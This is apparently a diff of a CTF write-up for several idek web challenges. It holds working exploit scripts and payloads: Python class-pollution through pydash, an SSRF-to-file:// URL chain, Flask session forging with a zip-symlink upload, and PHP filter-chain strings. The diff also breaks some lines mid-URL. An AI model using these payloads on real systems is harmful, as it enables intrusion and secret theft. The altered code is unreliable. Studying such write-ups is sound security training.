@@ -27,11 +27,6 @@
 20
 21
 22
-```
-
-
-
-```
 @app.route("/api/manage_tasks", methods=["POST"])
 def manage_tasks():
  task, status = request.json.get('task'), request.json.get('status')
@@ -50,15 +45,11 @@ def manage_tasks():
  if tasks.set(task, status):
  return {"message": "Task updated!"}, 200
  return {"message": "Invalid task name!"}, 400
- except Exception as e:
+ 
+except Exception as e:
  # e.
  print(e)
  return {"message": str(e)}, 200
-```
-
-
-
-```
 1
 2
 3
@@ -86,11 +77,6 @@ def manage_tasks():
 25
 26
 27
-```
-
-
-
-```
 import pydash
 
 class TaskManager:
@@ -118,29 +104,14 @@ class TaskManager:
 
  def get_all(self):
  return self.__dict__
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 @app.before_first_request
 def init():
  if app.env == "yojo":
  app.add_template_global(eval)
-```
-
-
-
-```
 1
 2
 3
@@ -158,11 +129,6 @@ def init():
 15
 16
 17
-```
-
-
-
-```
 FROM python:3.8.16-slim-bullseye
 
 RUN apt update && apt install -y xxd
@@ -180,45 +146,20 @@ WORKDIR /app
 COPY . .
 
 ENTRYPOINT ["python3", "app.py"]
-```
-
-
-
-```
 1
-```
-
-
-
-```
 {"task":"__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._static_folder","status":"/"}
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
-@app.route("/<path:path>")
+@app.route("/")
 def render_page(path):
  app._got_first_request = False
  if not os.path.exists("templates/" + path):
  return "not found", 404
  return render_template(path)
-```
-
-
-
-```
 1
 2
 3
@@ -257,16 +198,12 @@ def render_page(path):
 36
 37
 38
-```
-
-
-
-```
 import requests
 import re
 
-base_url = "http://localhost:1337"
-#base_url = "https://task-manager-dc512c530573c0b4.instancer.idek.team"
+base_url = "http://localhost:
+1337"
+    #base_url = "https://task-manager-dc512c530573c0b4.instancer.idek.team"
 
 hijack_start = """'""']:\n value = """
 hijack_end = "\n"
@@ -278,7 +215,7 @@ payloads = {
  "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string": hijack_end,
  "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir": "ZZZ",
  "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._got_first_request": None,
- 
+
 }
 
 def overwrite(attr, value):
@@ -299,11 +236,6 @@ for k, v in payloads.items():
  overwrite(k, v)
 
 get_flag()
-```
-
-
-
-```
 1
 2
 3
@@ -337,11 +269,6 @@ get_flag()
 31
 32
 33
-```
-
-
-
-```
 app = Flask(
  __name__,
  static_url_path='/static',
@@ -361,25 +288,21 @@ def add_headers(response):
 def index():
  return render_template('index.html')
 
-@app.route('/proxy/<path:path>')
+@app.route('/proxy/')
 @limiter.limit("10/minute")
 def proxy(path):
  remote_addr = request.headers.get('X-Forwarded-For') or request.remote_addr
  is_authorized = request.headers.get('X-Premium-Token') == PREMIUM_TOKEN or remote_addr == "127.0.0.1"
  try:
  page = urlopen(path, timeout=.5)
- except:
+ 
+except:
  return render_template('proxy.html', auth=is_authorized)
  if is_authorized:
  output = page.read().decode('latin-1')
  else:
- output = f"<pre>{page.headers.as_string()}</pre>"
+ output = f"{page.headers.as_string()}"
  return render_template('proxy.html', auth=is_authorized, content=output)
-```
-
-
-
-```
 1
 2
 3
@@ -408,18 +331,14 @@ def proxy(path):
 26
 27
 28
-```
-
-
-
-```
 events {
  worker_connections 1024;
 }
 
 http {
  include mime.types;
- proxy_cache_path /tmp/nginx keys_zone=my_zone:10m inactive=60m use_temp_path=off;
+ proxy_cache_path /tmp/nginx keys_zone=my_zone:
+10m inactive=60m use_temp_path=off;
 
  server {
 
@@ -429,11 +348,13 @@ http {
  location / {
  proxy_set_header Host $http_host;
  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
- proxy_pass http://localhost:3000;
+ proxy_pass http://localhost:
+3000;
  }
 
  location ^~ /static/ {
- proxy_pass http://localhost:3000;
+ proxy_pass http://localhost:
+3000;
  proxy_set_header Host $http_host;
  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
  proxy_cache my_zone;
@@ -441,11 +362,6 @@ http {
  }
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -459,101 +375,45 @@ http {
 11
 12
 13
-```
-
-
-
-```
 @full_url.setter
 def full_url(self, url):
- # unwrap('<URL:type://host/path>') --> 'type://host/path'
+ # unwrap('') --> 'type://host/path'
  self._full_url = unwrap(url)
  self._full_url, self.fragment = _splittag(self._full_url)
  self._parse()
- 
+
 def _splittag(url):
  """splittag('/path#tag') --> '/path', 'tag'."""
  path, delim, tag = url.rpartition('#')
  if delim:
  return path, tag
  return url, None
-```
-
-
-
-```
 1
-```
-
-
-
-```
-http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a
-```
-
-
-
-```
+http://127.0.0.1:
+1337/proxy/http://127.0.0.1:
+1337/proxy/file%3a///flag.txt%2523/../../../static/a
 1
-```
-
-
-
-```
-http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a
-```
-
-
-
-```
+http://127.0.0.1:
+1337/proxy/http://127.0.0.1:
+1337/proxy/file%3a///flag.txt%2523/../../../static/a
 1
 2
 3
 4
 5
-```
-
-
-
-```
 @app.route("/flag")
 def flag():
  if not session.get("admin"):
  return "Unauthorized!"
  return subprocess.run("./flag", shell=True, stdout=subprocess.PIPE).stdout.decode("utf-8")
-```
-
-
-
-```
 1
-```
-
-
-
-```
 app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 SECRET_OFFSET = 0 # REDACTED
 random.seed(round((time.time() + SECRET_OFFSET) * 1000))
 os.environ["SECRET_KEY"] = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
-```
-
-
-
-```
 1
 2
 3
@@ -573,11 +433,6 @@ os.environ["SECRET_KEY"] = "".join([hex(random.randint(0, 15)) for x in range(32
 17
 18
 19
-```
-
-
-
-```
 @app.route("/upload", methods=["GET", "POST"])
 def upload():
  if not session.get("uid"):
@@ -588,42 +443,28 @@ def upload():
  if "file" not in request.files:
  flash("You didn't upload a file!", "danger")
  return render_template("upload.html")
- 
+
  file = request.files["file"]
  uuidpath = str(uuid.uuid4())
  filename = f"{DATA_DIR}uploadraw/{uuidpath}.zip"
  file.save(filename)
- subprocess.call(["unzip", filename, "-d", f"{DATA_DIR}uploads/{uuidpath}"]) 
- flash(f'Your unique ID is <a href="/uploads/{uuidpath}">{uuidpath}</a>!', "success")
+ subprocess.call(["unzip", filename, "-d", f"{DATA_DIR}uploads/{uuidpath}"])
+ flash(f'Your unique ID is [{uuidpath}](/uploads/{uuidpath})!', "success")
  logger.info(f"User {session.get('uid')} uploaded file {uuidpath}")
  return redirect("/upload")
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
-@app.route("/uploads/<path:path>")
+@app.route("/uploads/")
 def uploads(path):
  try:
  return send_from_directory(DATA_DIR + "uploads", path)
- except PermissionError:
+ 
+except PermissionError:
  abort(404)
-```
-
-
-
-```
 1
 2
 3
@@ -634,11 +475,6 @@ def uploads(path):
 8
 9
 10
-```
-
-
-
-```
 # Configure logging
 LOG_HANDLER = logging.FileHandler(DATA_DIR + 'server.log')
 LOG_HANDLER.setFormatter(logging.Formatter(fmt="[{levelname}] [{asctime}] {message}", style='{'))
@@ -649,23 +485,8 @@ for handler in logging.root.handlers[:]:
  logging.root.removeHandler(handler)
 logging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')
 logging.getLogger().addHandler(logging.StreamHandler())
-```
-
-
-
-```
 1
-```
-
-
-
-```
 decoded = {'admin': True, 'uid': userinfo['username']}
-```
-
-
-
-```
 1
 2
 3
@@ -724,11 +545,6 @@ decoded = {'admin': True, 'uid': userinfo['username']}
 56
 57
 58
-```
-
-
-
-```
 import base64
 
 import requests, re, time, datetime, random
@@ -737,7 +553,8 @@ import flask_unsign
 sess = requests.session()
 SECRET_OFFSET = -67198624 * 1000
 userinfo = {"username": "yyds", "password": "yyds"}
-baseurl = "http://127.0.0.1:1337/"
+baseurl = "http://127.0.0.1:
+1337/"
 pocZip = "UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA"
 cookie = ""
 log_url = ""
@@ -782,23 +599,8 @@ if __name__ == '__main__':
  continue
  print(res)
  break
-```
-
-
-
-```
 1
-```
-
-
-
-```
 http.HandleFunc("/just-read-it", justReadIt)
-```
-
-
-
-```
 1
 2
 3
@@ -851,11 +653,6 @@ http.HandleFunc("/just-read-it", justReadIt)
 50
 51
 52
-```
-
-
-
-```
 func justReadIt(w http.ResponseWriter, r *http.Request) {
 	defer r.Body.Close()
 
@@ -908,39 +705,14 @@ func justReadIt(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(200)
 	w.Write([]byte(os.Getenv("FLAG")))
 }
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 type ReadOrderReq struct {
 	Orders []int `json:"orders"`
 }
-```
-
-
-
-```
 1
-```
-
-
-
-```
 reader := bytes.NewReader(randomData)
-```
-
-
-
-```
 1
 2
 3
@@ -949,11 +721,6 @@ reader := bytes.NewReader(randomData)
 6
 7
 8
-```
-
-
-
-```
 func initRandomData() {
 	rand.Seed(1337)
 	randomData = make([]byte, 24576)
@@ -962,47 +729,22 @@ func initRandomData() {
 	}
 	copy(randomData[12625:], password[:])
 }
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 func (v *Validator) CheckReadOrder(o int) error {
 	if o <= 0 || o > 100 {
  return fmt.Errorf("invalid order %v", o)
 	}
 	return nil
 }
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 ctx = WithValidatorCtx(ctx, reader, int(o))
 _, err := validator.Read(ctx)
-```
-
-
-
-```
 1
 2
 3
@@ -1011,11 +753,6 @@ _, err := validator.Read(ctx)
 6
 7
 8
-```
-
-
-
-```
 if err := validator.Validate(ctx); err != nil {
  w.WriteHeader(500)
  w.Write([]byte(fmt.Sprintf("validation failed: %v\n", err)))
@@ -1024,11 +761,6 @@ if err := validator.Validate(ctx); err != nil {
 
 	w.WriteHeader(200)
 	w.Write([]byte(os.Getenv("FLAG")))
-```
-
-
-
-```
 1
 2
 3
@@ -1040,11 +772,6 @@ if err := validator.Validate(ctx); err != nil {
 9
 10
 11
-```
-
-
-
-```
 func (v *Validator) Validate(ctx context.Context) error {
 	r, _ := GetValidatorCtxData(ctx)
 	buf, err := v.Read(WithValidatorCtx(ctx, r, 32))
@@ -1056,11 +783,6 @@ func (v *Validator) Validate(ctx context.Context) error {
 	}
 	return nil
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1070,11 +792,6 @@ func (v *Validator) Validate(ctx context.Context) error {
 7
 8
 9
-```
-
-
-
-```
 func (v *Validator) Read(ctx context.Context) ([]byte, error) {
 	r, s := GetValidatorCtxData(ctx)
 	buf := make([]byte, s)
@@ -1084,11 +801,6 @@ func (v *Validator) Read(ctx context.Context) ([]byte, error) {
 	}
 	return buf, nil
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1097,11 +809,6 @@ func (v *Validator) Read(ctx context.Context) ([]byte, error) {
 6
 7
 8
-```
-
-
-
-```
 func GetValidatorCtxData(ctx context.Context) (io.Reader, int) {
 	reader := ctx.Value(reqValReaderKey).(io.Reader)
 	size := ctx.Value(reqValSizeKey).(int)
@@ -1110,29 +817,14 @@ func GetValidatorCtxData(ctx context.Context) (io.Reader, int) {
 	}
 	return reader, size
 }
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 // NewReader returns a new Reader whose buffer has the default size.
 func NewReader(rd io.Reader) *Reader {
 	return NewReaderSize(rd, defaultBufSize)
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1155,11 +847,6 @@ func NewReader(rd io.Reader) *Reader {
 20
 21
 22
-```
-
-
-
-```
 <?php
 
  error_reporting(0);
@@ -1179,66 +866,16 @@ func NewReader(rd io.Reader) *Reader {
  die('nothing here');
  }
  }
- 
+
  ?>
-```
-
-
-
-```
 1
-```
-
-
-
-```
 FREE�B�5$TԕT���FV��F�F��U�E�7V'65##�u�C��W%��7w5�W"����>==�@C������>==�@
-```
-
-
-
-```
 1
-```
-
-
-
-```
 http://127.0.0.1/?p=php://filter/convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode/resource=flag
-```
-
-
-
-```
 1
-```
-
-
-
-```
 idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}
-```
-
-
-
-```
 1
-```
-
-
-
-```
 python php_filter_chain_generator.py --chain 'FREE '
-```
-
-
-
-```
 1
-```
-
-
-
-```
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag
 ```
